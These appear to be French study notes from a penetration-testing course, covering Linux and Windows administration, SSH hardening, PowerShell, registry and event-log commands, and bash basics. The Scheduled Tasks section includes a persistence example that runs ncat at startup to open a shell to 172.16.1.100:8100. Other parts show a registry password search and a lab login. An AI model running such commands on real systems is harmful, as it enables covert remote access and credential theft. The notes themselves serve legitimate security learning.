<!-- 10K to be an Master 

https://github.com/darklab8/fl-darkstat

https://www.amazon.fr/Code-Complete-Second-Steve-McConnell/dp/0735619670

https://www.amazon.com/Unit-Testing-Principles-Practices-Patterns/dp/1617296279

https://www.amazon.com/Test-Driven-Development-Kent-Beck/dp/0321146530

https://www.amazon.com/Clean-Architecture-Craftsmans-Software-Structure/dp/0134494164

https://cryptopals.com/ -->

# Linux Fondamental

## launch Server Web

- From apt :`apt install apache2`

- from python : `python3 -m http-server`

- from npm  : `npm install http-server && http-server -p 8080`

- from php : `php -S 127.0.0.1:8080`

## Backup and Restore

- Outil de Sauvegarde  :
  - Rsync
  - Deja Dup
  - Duplicity

- Outil de cryptage des données
  - GnyPG
  - eCryptfs
  - LUKS

  - Rsync :
    `rsync -av /path/to/mydirectory user@backup_server:/path/to/backup/directory`

  - On peut crypter le transfert rsync avec ssh : `sync -avz -e ssh /path/to/mydirectory user@backup_server:/path/to/backup/directory`

  - Ajouter votre sauvegarde à Cron

## File system Management

| Type  | description                          |
| ----- | ------------------------------------ |
| ext2  | system de gestion de base            |
| btrfs | ( convient au besoin instantanée)    |
| NTFS  | besoin de compatibilité avec WINDOWS |

- outil de partionnement :
  - fdisk
  - gpart
  - GParted

Swap ( zone temporaire de mémoire )

## Contener

### Docker

**Docker build :**

docker ps -a
docker image
docker rm <container_id>
docker rm -f <container_id>
docker rmi <image_id>
docker rmi -f <image_id>
docker ps Listez tous les conteneurs en cours d'exécution
docker stop Arrêtez un conteneur en cours d'exécution.
docker start Démarrer un conteneur arrêté.
docker restart Redémarrez un conteneur en cours d'exécution.
docker rm Retirer un conteneur.
docker rmi Supprimer une image Docker.
docker logs Voir les journaux d'un conteneur.

### LXC

1   Install LXC on your machine and create your first container.

2 Configure the network settings for your LXC container.

3 Create a custom LXC image and use it to launch a new container.

4 Configure resource limits for your LXC containers (CPU, memory, disk space).

5 Explore the lxc-* commands for managing containers.

6 Use LXC to create a container running a specific version of a web server (e.g., Apache, Nginx).

7 Configure SSH access to your LXC containers and connect to them remotely.

8 Create a container with persistence, so changes made to the container are saved and can be reused.

9 Use LXC to test software in a controlled environment, such as a vulnerable web application or malware.

## Configuration du Réseau

### NAC

- DAC;MAC;RBAC
- Stratégie SELinux
- AppArmor est un linux Security Module (LSM)
- wrappers TCP

### introduction à l'analyse

ping
traceroute
netstat
tcpdump
wireshark
nmap
ss -plnt

1. Installez SELinux sur votre VM.
2. Configurez SELinux pour empêcher un utilisateur d'accéder à un fichier spécifique.
3. Configurez SELinux pour permettre à un seul utilisateur d'accéder à un service réseau spécifique, mais refusez l'accès à tous les autres.
4. Configurez SELinux pour refuser l'accès à un utilisateur ou à un groupe spécifique pour un service réseau spécifique.
AppArmor
5. Configurez AppArmor pour empêcher un utilisateur d'accéder à un fichier spécifique.
6. Configurez AppArmor pour permettre à un seul utilisateur d'accéder à un service réseau spécifique, mais refusez l'accès à tous les autres.
7. Configurez AppArmor pour refuser l'accès à un utilisateur ou à un groupe spécifique pour un service réseau spécifique.
TCP Enveloppeurs
8. Configurez les wrappers TCP pour permettre l'accès à un service réseau spécifique à partir d'une adresse IP spécifique.
9. Configurez les wrappers TCP pour refuser l'accès à un service réseau spécifique à partir d'une adresse IP spécifique.
10. Configurez les wrappers TCP pour permettre l'accès à un service réseau spécifique à partir d'une gamme d'adresses IP

**X11 sécurisé :**

xwd
xgrabsc

VNC protocole RFB
tigervpn
tightVNC
realVNC (crypté)
UltraVNC (crypté)

### Linux Security

Ronflement, chkrootkit, rkhunter, Lynis

- Supprimer ou désactiver tous les services et logiciels inutiles
- Suppression de tous les services qui reposent sur des mécanismes
- d'authentification non chiffrés
- Assurez-vous que NTP est activé et que Syslog est en cours d'exécution.
- Assurez-vous que chaque utilisateur possède son propre compte
- Appliquer l'utilisation de mots de passe forts
- Configurez le vieillissement des mots de passe et limitez
- l'utilisation -des mots de passe précédents
- Verrouillage des comptes utilisateurs après des échecs de connexion
- Désactivez tous les binaires SUID/SGID indésirables

### Log system

Kernel Logs
System Logs
Authentication Logs
Application Logs
Security Logs

### Solaris

code source peut connu ( cercle fermé)
Zttabyte ZFS pour le system de fichier
smf pour le service de management facility
IPS pour le packaging system
Rbac pour les controles d'acces

`showrev -a`
Hostname: solaris
Kernel architecture: sun4u
OS version: Solaris 10 8/07 s10s_u4wos_12b SPARC
Application architecture: sparc
Hardware provider: Sun_Microsystems
Domain: sun.com
Kernel version: SunOS 5.10 Generic_139555-08

Solaris truss
ubuntu Strace

- Strace est une alternative à truss mais pour Ubuntu, et c'est un outil essentiel pour les administrateurs système et les développeurs, les aidant à diagnostiquer et résoudre les problèmes en temps réel. Il permet aux utilisateurs d'analyser les interactions entre le système d'exploitation et les applications qui s'y exécutent, ce qui est particulièrement utile dans des environnements très complexes et critiques

**command pour grep process apache :**

`ps auxw | grep sbin/apache | awk '{print"-p " $2}' | xargs strace`

------------------------------------------

# Setting up

## Introduction

## Organization

**Structurer son audit :**
gestion des mdp : 1Mot-passe LastPass Gardien Bitwarden

## mise à jour et automatisation

## prise de note

information nouvelle ;
idées pour des tests et des traitements ultérieurs ;
résultats de l'analyse ;
Enregistrement ;
capture d'écran ;

- outil de prise de notre : `Notion.so`, `Obsidian` et `Xmind`
- ur la documentation. Pour cela, nous pouvons utiliser `GhostWriter` ou `Pwndoc`.

Outil de capture d'écran flammes
Creer des gif  : peigne

## Virtualisation

Virtualisation matérielle

Virtualisation des applications

Virtualisation du stockage

Virtualisation des données

Virtualisation réseau

Avantage :

1. Les applications et les services d'une VM n'interfèrent pas entre eux
2. Indépendance totale du système invité vis-à-vis du système d'exploitation du système hôte et du matériel physique sous-jacent
3. Les VM peuvent être déplacées ou clonées vers d'autres systèmes par simple copie
4. Les ressources matérielles peuvent être allouées dynamiquement via l'hyperviseur
5. Utilisation améliorée et plus efficace des ressources matérielles existantes
6. Des délais de provisionnement plus courts pour les systèmes et les applications
7. Gestion simplifiée des systèmes virtuels
8. Disponibilité accrue des VM grâce à l'indépendance vis-à-vis des ressources physiques

## Container

#### Preparez ses VM { Linux & Winsdows}

Deux snapshots avec les outils pret à être installé

Outils pouvant être utilisés pour installer les anciennes versions de Windows:

Chocolaté

MediaCreationTool.bat

Outil de téléchargement ISO Microsoft Windows et Office

Rufus

### config VPS

- Install Fail2ban
- Working only with SSH keys
- Reduce Idle timeout interval
- Disable passwords
- Disable x11 forwarding
- Use a different port
- Limit users' SSH access
- Disable root logins
- Use SSH proto 2
- Enable 2FA Authentication for SSH

> sshd_config :

`LogLevel VERBOSE`  Gives the verbosity level that is used when logging messages from SSH daemon.

```PermitRootLogin no```  Specifies whether root can log in using SSH.

```MaxAuthTries 3```  Specifies the maximum number of authentication attempts permitted per connection.

```MaxSessions 5```  Specifies the maximum number of open shell, login, or subsystem (e.g., SFTP) sessions allowed per network connection.

```HostbasedAuthentication no```  Specifies whether rhosts or /etc/hosts.equiv authentication together with successful public key client host authentication is allowed (host-based authentication).

```PermitEmptyPasswords no```  When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings.

```ChallengeResponseAuthentication yes```  Specifies whether challenge-response authentication is allowed.

```UsePAM yes```  Specifies if PAM modules should be used for authentification.

```X11Forwarding no```  Specifies whether X11 forwarding is permitted.

```PrintMotd no```  Specifies whether SSH daemon should print /etc/motd when a user logs in interactively.

``` ClientAliveInterval 600 ``` Sets a timeout interval in seconds, after which if no data has been received from the client, the SSH daemon will send a message through the encrypted channel to request a response from the client.

```ClientAliveCountMax 0```  Sets the number of client alive messages which may be sent without SSH daemon receiving any messages back from the client.

```AllowUsers <username>```  This keyword can be followed by a list of user name patterns, separated by spaces. If specified, login is allowed only for user names that match one of the patterns.

```Protocol 2```  Specifies the usage of the newer protocol which is more secure.

```AuthenticationMethods publickey,keyboard-interactive```  Specifies the authentication methods that must be successfully completed for a user to be granted access.

```PasswordAuthentication no```  Specifies whether password authentication is allowed.

**OTP on VPS :**
[https://www.linuxbabe.com/debian/ssh-two-factor-authentication-debian](SSH_2FA)

# Windows Fondamental

```Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber```

**techno de prise à disctance :**

Réseaux Privés Virtuels (VPN)
Secure Shell (SSH)
Protocole de Transfert de Fichier (FTP)
Virtual Network Computing (VNC)
Gestion à distance Windows (ou PowerShell Remoting) (WinRM)
Protocole Bureau à Distance (RDP)

**Outil xfreerdp :**

`xfreerdp /v:<targetIp> /u:htb-student /p:Password`

## System de fihiers

### FAT32 or else

**Pros of FAT32 :**

Compatibilité des appareils - il peut être utilisé sur les ordinateurs, les appareils photo numériques, les consoles de jeu, les smartphones, les tablettes, etc.
Compatibilité croisée du système d'exploitation - Il fonctionne sur tous les systèmes d'exploitation Windows à partir de Windows 95 et est également pris en charge par MacOS et Linux.
Cons of FAT32:

Ne peut être utilisé qu'avec des fichiers de moins de 4Go.
Pas de protection des données intégrée ou de compression de fichiers.
Doit utiliser des outils tiers pour le cryptage des fichiers.

### NTFS

**Pros of NTFS:**

NTFS est fiable et peut restaurer la cohérence du système de fichiers en cas de défaillance du système ou de perte de puissance.
Assure la sécurité en nous permettant de définir des autorisations granulaires sur les fichiers et dossiers.
Prend en charge les partitions de très grande taille.
A journalisation intégrée, ce qui signifie que les modifications de fichiers (ajout, modification, suppression) sont enregistrées.
Cons of NTFS:

La plupart des appareils mobiles ne prennent pas en charge NTFS nativement.
Les périphériques multimédias plus anciens tels que les téléviseurs et les appareils photo numériques n'offrent pas de prise en charge des périphériques de stockage NTFS.

#### Liste Controle d'acces (icacls)

icacls c:\windows

Le niveau d'accès aux ressources est répertorié après chaque utilisateur dans la sortie. Les paramètres d'héritage possibles sont les suivants:

(CI): conteneur hériter
(OI): objet hériter
(IO): hériter seulement
(NP): ne pas propager hériter
(I): permission héritée du conteneur parent

Les autorisations d'accès de base sont les suivantes :

`icacls c:\Users`

F : accès complet
D :  supprimer l'accès
N :  pas d'accès
M :  modifier l'accès
RX :  lire et exécuter l'accès
R :  accès en lecture seule
W:  accès en écriture seule

**cifs tools : cifs-utils**

### Working with Services & Processes

Les services Windows sont gérés via le système Service Control Manager (SCM),

`lsass.exe` est le processus responsable de l'application de la stratégie de sécurité sur les systèmes Windows

``` xfreerdp /v:<target IP address> /u:htb-student /p:<password> ```  RDP à cible de laboratoire

```Get-WmiObject -Class win32_OperatingSystem```  Obtenir des informations sur le système d'exploitation

``` dir c:\ /a ```  Afficher tous les fichiers et répertoires dans le répertoire racine c:\

```tree <directory>```  Affichage graphique de la structure de répertoire d'un chemin

```tree c:\ /f | more```  Parcourez les résultats de la tree commande page par page

``` icacls <directory> ```  Afficher les autorisations définies sur un répertoire

```icacls c:\users /grant joe:f```  Accorder à un utilisateur des autorisations complètes sur un répertoire

``` icacls c:\users /remove joe ```  Supprimer les autorisations d'un utilisateur sur un répertoire

`Get-Service` PowerShellcmdlet pour afficher les services en cours d'exécution

```help <command>```  Afficher le menu d'aide pour une commande spécifique

```get-alias```  Liste PowerShell alias

```New-Alias -Name "Show-Files" Get-ChildItem```  Créer un nouveau PowerShell alias

```Get-Module | select Name,ExportedCommands | fl```  Voir importé PowerShell modules et leurs commandes associées

```Get-ExecutionPolicy -List```  Voir le PowerShell politique d'exécution

```Set-ExecutionPolicy Bypass -Scope Process```  Définissez le PowerShell stratégie d'exécution à contourner
pour la session en cours
```wmic os list brief```  Obtenez des informations sur le système d'exploitation avec wmic

```Invoke-WmiMethod```  Appeler des méthodes de WMI objets

```whoami /user```  Voir le SID des utilisateurs actuels

```reg query <key>```  Afficher des informations sur une clé de registre

```Get-MpComputerStatus```  Vérifiez qui Defender les paramètres de protection sont activés

```sconfig```  Charger le menu Configuration du serveur dans Windows Server Core

### Permissions de Service

    Il est fortement recommandé de créer un compte utilisateur individuel pour exécuter des services réseau critiques.Ces comptes sont appelés comptes de service

`LocalSystem`  qui est le plus haut niveau d'accès autorisé sur un OS Windows individuel.

Comptes de service intégrés notables dans Windows
--------------------------------------------------

- LocalService

- NetworkService

- LocalSyste

 ```Les descripteurs```  de sécurité identifient le propriétaire d'object’s et un groupe primaire contenant un Discretionary Access Control List (DACL) et a System Access Control List (SACL')

**Security Descriptor Definition Language (SDDL') :**
```D:(A;;CCLCSWRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)```

D: - les caractères en cours sont des autorisations DACL
AU: - définit le principe de sécurité Utilisateurs authentifiés
A;; - l'accès est autorisé
CC - SERVICE_QUERY_CONFIG est le nom complet, et c'est une requête au gestionnaire de contrôle de service (SCM) pour la configuration de service
LC - SERVICE_QUERY_STATUS est le nom complet, et c'est une requête au gestionnaire de contrôle de service (SCM) pour l'état actuel du service
SW - SERVICE_ENUMERATE_DEPENDENTS est le nom complet, et il va énumérer une liste de services dépendants
RP - SERVICE_START est le nom complet, et il va démarrer le service
LO - SERVICE_INTERROGATE est le nom complet, et il va interroger le service pour son état actuel
RC - READ_CONTROL est le nom complet, et il va interroger le descripteur de sécurité du service

Autorisation via powershell avec Get-ACL :

```Get-ACL -Path HKLM:\System\CurrentControlSet\Services\wuauserv | Format-List```

### Windows Sessions

Interactif

non-interatif :

**Compte local du system :**

- SYSTEM (GOD -_-)
  - LocalService
  - NetworkService

### intéragir avec Windows OS

#### Gui

#### RDP

[lien sur le protocol RDP de Microsoft](https://learn.microsoft.com/en-US/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol)

#### CLI

get-alias
Get-ExecutionPolicy -List

### WMI

**WMI est un sous-système de PowerShell**

```WMI service```  Le processus Windows Management Instrumentation, qui s'exécute automatiquement au démarrage et sert d'intermédiaire entre les fournisseurs WMI, le référentiel WMI et la gestion des applications.

```Objets gérés```  Tout composant logique ou physique pouvant être géré par WMI.

```WMI fournisseurs```  Objets qui surveillent les événements/données liés à un objet spécifique.

```Classes```  Ceux-ci sont utilisés par les fournisseurs WMI pour transmettre des données au service WMI.

```Méthodes```  Ceux-ci sont attachés à des classes et permettent d'effectuer des actions. Par exemple, des méthodes peuvent être utilisées pour démarrer/arrêter des processus sur des machines distantes.

```WMI dépôt```  Une base de données qui stocke toutes les données statiques liées à WMI.

```CIM Gestionnaire d'Objets```sell  Le système qui demande des données aux fournisseurs WMI et les renvoie à l'application qui le demande.

```API WMI API```  Permet aux applications d'accéder à l'infrastructure WMI.

```WMI Consommateur```  Envoie des requêtes aux objets via le CIM Object Manager.

Certaines des utilisations pour WMI sont:

- Informations d'état pour les systèmes locaux/éloignés
- Configuration des paramètres de sécurité sur les machines/applications distantes
- Définir et modifier les autorisations utilisateur et de groupe
- Définir/modifier les propriétés du système
- Exécution de code
- Planification des processus
- Configuration de la journalisation

SSID des user :

```shell
wmic useraccount get name,sid
wmic group get name,sid
Get-Wmiobject -Class Win32_UserAccount
Get-Wmiobject -Class Win32_Group
```

Login from Parrot Os :

`xfreerdp /v:STMIP /u:USER /p:PASSWORD /dynamic-resolution`
`xfreerdp /v:10.129.217.240 /u:htb-student /p:HTB_@cademy_stdnt! /dynamic-resolution`

# INTRODUCTION TO WINDOWS COMMAND LINE

NE pas sous estimer l'élévation de privilege avec CMD.

Find
type
more
echo
rm
md
ren
xcopy
copy

**systeminfo**
    -   **Ceneral information**
        -   hostname
        -   os information
            -   os name
            -   os version
            -   os configuration
            -   installed hotfix / package
    -   **network information**
        -   ip address
        -   availaible network interface
        -   accessible subet (route)
        -   dns
        -   localhost knows host
        -   network ressource
            -   network share
            -   domain ressources
            -   network devices (printer,etc)
        -   host firewall config
    -   **basic domaine information**
        -   domaine name
        -   logon server
    -   **user information**
        -   user account
        -   local group
        -   env variable
        -   available task
            -   currently running on host
            -   scheduled tasks
        -   Available Service
            -   know antivirus Solutions
            -   IDS / IPS Solution

Quelles informations système pouvons-nous tirer de notre hôte cible?
Avec quel autre système(s) notre hôte cible interagit-il sur le réseau?
À quel compte utilisateur(s) avons-nous accès et quelles informations sont accessibles depuis le compte(s)?
À quel compte utilisateur avons-nous accès?
À quels groupes appartient notre utilisateur?
À quel ensemble de privilèges de travail notre utilisateur a-t-il accès?
À quelles ressources nos utilisateurs peuvent-ils accéder via le réseau?
Quelles tâches et quels services sont exécutés sous notre compte utilisateur?

hostname
systeminfo
whoami
whoami /priv
whoami /groups
ver
ipconfig
ipconfig /all
arp /a
net user
net localgroup
net share
net view
where cmd
tree /F c:\
tasklist /svc
net start
wmic service list brief  

## Scheduled Tasks  

`SCHTASKS /Query /V /FO list`

- /create: pour lui dire ce que nous faisons
- /sc: nous devons établir un calendrier
- /tn: nous devons définir le nom
- /tr: nous devons lui donner une action à prendre
  
 `chtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"`

## Powershell

Tache connu utlisé sur powerShell :

Provisioning des serveurs et installation des rôles de serveur
Création de comptes utilisateur Active Directory pour les nouveaux employés
Gestion des autorisations de groupe Active Directory
Désactivation et suppression des comptes utilisateurs Active Directory
Gestion des autorisations de partage de fichiers
Interagir avec Azure VMs AD et Azure
Création, suppression et surveillance des répertoires et des fichiers
Collecte d'informations sur les postes de travail et les serveurs
Configuration des boîtes de réception Microsoft Exchange pour les utilisateurs (dans le cloud et/ou sur site)

### Commande

get-command
get-command -verb get
get-location

### Module

get-module
find-module
Import-Module PowerShellGet
Find-Module -Name AdminToolbox
Install-Module -Name AdminToolbox -RequiredVersion 11.0.8

### gestion des users & Group

Type de compte
----------------

Administrator
Default Account
Guest Account
WDAGUtility Account

get-localgroup
get-localuser
New-LocalUser -Name "JLawrence" -NoPassword
$Password = Read-Host -AsSecureString
Set-LocalUser -Name "JLawrence" -Password $Password -Description "CEO EagleFang"
Get-LocalGroupMember -Name "Users"
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "JLawrence"
Get-LocalGroupMember -Name "Remote Desktop Users"

Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online
Get-Module -Name ActiveDirectory -ListAvailable

Command Alias Description
Get-Item gi Retrieve an object (could be a file, folder, registry object, etc.)
Get-ChildItem ls / dir / gci Lists out the content of a folder or registry hive.
New-Item md / mkdir / ni Create new objects. ( can be files, folders, symlinks, registry entries, and more)
Set-Item si Modify the property values of an object.
Copy-Item copy / cp / ci Make a duplicate of the item.
Rename-Item ren / rni Changes the object name.
Remove-Item rm / del / rmdir Deletes the object.
Get-Content cat / type Displays the content within a file or object.
Add-Content ac Append content to a file.
Set-Content sc overwrite any content in a file with new data.
Clear-Content clc Clear the content of the files without deleting the file itself.
Compare-Object diff / compare Compare two or more objects against each other. This includes the object itself and the content within.

Exemple pour recherche un fichier :

`Get-Childitem –Path C:\Users\ -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.txt")}`

### Working with Services

```shell
 get-help *-Service
```

Faire une enquete sur le statue des process ( exemple personne qui se plaind d'un souci de défénse de ses process de sécurité sur windows )

`Get-Service | ft DisplayName,Status`

```shell
  Get-Service | measure
```

`Get-Service | where DisplayName -like '*Defender*' | ft DisplayName,ServiceName,Status`

`get-service -ComputerName {HOST}-ICL-DC`

`invoke-command`

### Working with Registry

`Get-ChildItem C:\Windows\System32\config\`

`Get-Item -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | Select-Object -ExpandProperty Property`

`Get-ChildItem -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion -Recurse`

`Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

Rechercher la chaine passowrd dans le registre HKCU
`REG QUERY HKCU /F "Password" /t REG_SZ /S /K`

| Commande      | Description                                                                                                   |
| ------------- | ------------------------------------------------------------------------------------------------------------- |
| Reg query     | Nous appelons Reg.exe et spécifions que nous voulons interroger les données.                                  |
| HKCU          | Cette partie définit le chemin à rechercher. Dans ce cas, nous examinons tout HKey_Current_User.              |
| /f "password" | /f définit le modèle que nous recherchons. Dans ce cas, nous recherchons "Mot de passe".                      |
| /t REG_SZ     | /t définit le type de valeur à rechercher. Si nous ne spécifions pas, la requête reg recherchera chaque type. |
| /s            | /s dit de rechercher toutes les sous-clés et valeurs de manière récursive.                                    |
| /k            | /k se limite à rechercher uniquement les noms de clés.                                                        |

Pratiquer les cmdlet de manipulation de base de registre

### Working with Event log

-  

```shell
wevtutil el
```

```shell
ls C:\Windows\System32\winevt\logs
```

```shell
wevtutil gl "Windows PowerShell"
```

```shell
wevtutil gli "Windows PowerShell"
```

```shell
wevtutil qe Security /c:5 /rd:true /f:text
```

```shell
wevtutil epl System C:\system_export.evtx
```

- liste les jounaux :

```shell
  Get-WinEvent -ListLog *

    Get-WinEvent -ListLog Security
```

```shell
*   login Failure :
   
    `Get-WinEvent -FilterHashTable @{LogName='Security';ID='4625 '}`
```

```shell
*   Event critical :
   
    Get-WinEvent -FilterHashTable @{LogName='System';Level='1'} | select-object 

    Get-WinEvent -FilterHashTable @{LogName='System';Level='1'} | select-object -ExpandProperty Message
```

### Networking Management from The CLI

| Protocole  | Description                                                                                                                                                                                                                                                                                                                                                                             |
| ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| SMB        | SMB fournit aux hôtes Windows la possibilité de partager des ressources, des fichiers et un moyen standard d'authentification entre les hôtes pour déterminer si l'accès aux ressources est autorisé. Pour les autres distributions, SAMBA est l'option open-source.                                                                                                                    |
| Netbios    | NetBios elle-même n'est pas directement un service ou un protocole, mais un mécanisme de connexion et de conversation largement utilisé dans les réseaux. C'était le mécanisme de transport original pour SMB, mais cela a changé depuis. Maintenant, il sert de mécanisme d'identification alternatif lorsque DNS échoue. Peut également être appelé NBT-NS (NetBIOS name service).    |
| LDAP       | LDAP est un open-source protocole multiplateforme utilisé pour authentication et authorization avec divers services d'annuaire. C'est ainsi que de nombreux appareils différents dans les réseaux modernes peuvent communiquer avec de grands services de structure d'annuaire tels que Active Directory.                                                                               |
| LLMNR      | LLMNR fournit un service de résolution de noms basé sur DNS et fonctionne si DNS n'est pas disponible ou ne fonctionne pas. Ce protocole est un protocole de multidiffusion et, en tant que tel, ne fonctionne que sur les liens locaux (dans un domaine de diffusion normal, pas à travers la couche trois liens).                                                                     |
| DNS        | DNS est une norme de dénomination commune utilisée sur Internet et dans la plupart des types de réseaux modernes. DNS nous permet de référencer les hôtes par un nom unique au lieu de leur adresse IP. Voici comment nous pouvons référencer un site Web par "WWW.google.com" au lieu de "8.8.8.8". En interne, c'est ainsi que nous demandons des ressources et un accès à un réseau. |
| HTTP/HTTPS | HTTP/S HTTP et HTTPS sont la façon non sécurisée et sécurisée dont nous demandons et utilisons des ressources sur Internet. Ces protocoles sont utilisés pour accéder et utiliser des ressources telles que les serveurs Web, envoyer et recevoir des données de sources distantes, et bien plus encore.                                                                                |
| Kerberos   | Kerberos est un protocole d'authentification au niveau du réseau. Dans les temps modernes, nous sommes plus susceptibles de le voir lorsqu'il s'agit de l'authentification Active Directory lorsque les clients demandent des tickets pour l'autorisation d'utiliser des ressources de domaine.                                                                                         |
| WinRM      | WinRM Est une implémentation du protocole WS-Management. Il peut être utilisé pour gérer les fonctionnalités matérielles et logicielles des hôtes. Il est principalement utilisé dans l'administration IT mais peut également être utilisé pour l'énumération des hôtes et comme moteur de script.                                                                                      |
| RDP        | RDP est une implémentation Windows d'un protocole de services d'interface utilisateur réseau qui fournit aux utilisateurs une interface graphique pour accéder aux hôtes via une connexion réseau. Cela permet une utilisation complète de l'interface utilisateur pour inclure le passage de l'entrée du clavier et de la souris à l'hôte distant.                                     |
| SSH        | SSH est un protocole sécurisé qui peut être utilisé pour l'accès sécurisé à l'hôte, le transfert de fichiers et la communication générale entre les hôtes du réseau. Il fournit un moyen d'accéder en toute sécurité aux hôtes et services sur des réseaux non sécurisés.                                                                                                               |

#### Net Cmdlets

--------------------

| Cmdlet             | Description                                                                                                                          |
| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------ |
| Get-NetIPInterface | Récupérer tout visible adaptateur réseau properties.                                                                                 |
| Get-NetIPAddress   | Récupère le IP configurations de chaque adaptateur. Semblable à IPConfig.                                                            |
| Get-NetNeighbor    | Récupère le neighbor entries depuis le cache. Semblable à arp -a.                                                                    |
| Get-Netroute       | Il va imprimer le courant route table. Semblable à IPRoute.                                                                          |
| Set-NetAdapter     | Définissez les propriétés de base de l'adaptateur sur Layer-2 niveau tel que VLAN id, description et MAC-Address.                    |
| Set-NetIPInterface | Modifie le settings de un interface pour inclure l'état DHCP, MTU, et d'autres mesures.                                              |
| New-NetIPAddress   | Crée et configure un IP address.                                                                                                     |
| Set-NetIPAddress   | Modifie le configuration d'une carte réseau.                                                                                         |
| Disable-NetAdapter | Utilisé pour disable interfaces d'adaptateur réseau.                                                                                 |
| Enable-NetAdapter  | Utilisé pour rallumer les adaptateurs réseau et allow connexions réseau.                                                             |
| Restart-NetAdapter | Utilisé pour redémarrer un adaptateur. Il peut être utile d'aider à pousser changes fait à l'adaptateur settings.                    |
| test-NetConnection | Permet de diagnostic vérifications à exécuter sur une connexion. Il prend en charge ping, tcp, traçage d'itinéraire, et plus encore. |

- Outil PS Network :
  
[Test-NetConnection](https://learn.microsoft.com/en-us/powershell/module/nettcpip/test-netconnection?view=windowsserver2022-ps)

- Activer SSH :

```shell  
Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'
```

```shell
Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
```

```shell
Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'
```

```shell
Start-Service sshd
```

```shell
 Set-Service -Name sshd -StartupType 'Automatic'
 ```

```shell
ssh user@ip
```

```shell
powershell
```

```shell
test-netconnection
```

#### Le web est powershell

```shell

Get-Help Invoke-Webrequest
Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" Method GET | Get-Member
Invoke-WebRequest -Uri "https://charles.siepen.fr" -Method GET | fl images

```

#### Script powershell et automatisation

PowerShell Extensions
| Extension | Description                                                                                                                       |
| --------- | --------------------------------------------------------------------------------------------------------------------------------- |
| ps1       | Le *.ps1 l'extension de fichier représente les scripts PowerShell exécutables.                                                    |
| psm1      | Le *.psm1 l'extension de fichier représente un fichier de module PowerShell. Il définit ce qu'est le module et ce qu'il contient. |
| psd1      | Le *.psd1 est un fichier de données PowerShell détaillant le contenu d'un module PowerShell dans une table de paires clé/valeur.  |

##### Créer un module powerShell

*chercher fichier cacher :*

```shell
dir /a:h /s /b | find /c /v ""
```

*trouver un fichier non vide :*

```shell
for /r %i in (flag.txt) do @if %~zi gtr 0 echo %i
```

*trouver le register of the host :*

```shell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "RegisteredOwner"
```

*trouver le given name de l'utilisateur qui flag en nom de famille:*

```shell
Get-ADUser -Filter {(Surname -eq "Flag")} -Properties GivenName | Select-Object GivenName
```

*Use the tasklist command to print running processes and then sort them in reverse order by name. The name of the process that begins with "vm" is the flag for this user.*

```shell
tasklist | sort /r  | findstr /i "vm"  
```

*trouver un user utilisé sur l'evenement x :*

```shell
Get-WinEvent -FilterHashTable @{LogName='Security';ID='x'} | Select-Object -ExpandProperty Message
```

# INTRODUCTION TO BASH SCRIPTING

## Bourne Again Shell

## Exécution Conditionnelle

*Il faut retenir que nous utiliserons les scripts principalement pour executer des taches.*

> Améliorer notre efficacité sur l'énumération par exemple ou tester de multiple possibilitées.

    Les scripts nous permette de conditionner nos besoins en résultat au lieu d'excuter des commandes les unes apres la autre . ( exemple : si tu trouve un port ouver tu fais ça ! tester un argument, etc...)

- ``#!/bin/bash-`` Shebang.
- ``if-else-fi-`` Exécution conditionnelle.
- ``echo-`` Imprime une sortie spécifique.
- `$# / $0 / $1` - Variables spéciales.
- `domain-` Variables.

### Shebang

    La ligne shebang est toujours en haut de chaque script et commence toujours par "#!". Cette ligne contient le chemin d'accès à l'interpréteur spécifié (/bin/bash) avec lequel le script est exécuté. Nous pouvons également utiliser Shebang pour définir d'autres interprètes comme Python, Perl et d'autres.

```py
#!/usr/bin/env python
```

```perl
#!/usr/bin/env perl
```

### if else fi

    Vérifier des conditions

```shell
if [ the number of given arguments equals 0 ]
then
 Print: "You need to specify the target domain."
 Print: "<empty line>"
 Print: "Usage:"
 Print: "   <name of the script> <domain>"
 Exit the script with an error
else
 The "domain" variable serves as the alias for the given argument finish the if-condition
```

## Arguments, Variables, and Arrays

### Variable spécial

| IFS | Description                                                                                                                                                                              |
| --- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| $#  | Cette variable contient le nombre d'arguments passés au script.                                                                                                                          |
| $@  | Cette variable peut être utilisée pour récupérer la liste des arguments de ligne de commande.                                                                                            |
| $n  | Chaque argument de ligne de commande peut être récupéré sélectivement en utilisant sa position. Par exemple, le premier argument se trouve à $1.                                         |
| $$  | L'ID du processus en cours d'exécution.                                                                                                                                                  |
| $?  | Le statut de sortie du script. Cette variable est utile pour déterminer le succès d'une commande. La valeur 0 représente une exécution réussie, tandis que 1 est le résultat d'un échec. |

- Parmi ceux présentés ci-dessus, nous avons 3 variables spéciales dans notre if-else condition.

| IFS | Description                                                                                                                                                                                                                                                                           |
| --- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| $#  | Dans ce cas, nous avons besoin d'une seule variable qui doit être affectée à la domain variable. Cette variable est utilisée pour spécifier la cible avec laquelle nous voulons travailler. Si nous fournissons juste un FQDN comme argument, le $# la variable aura une valeur de 1. |
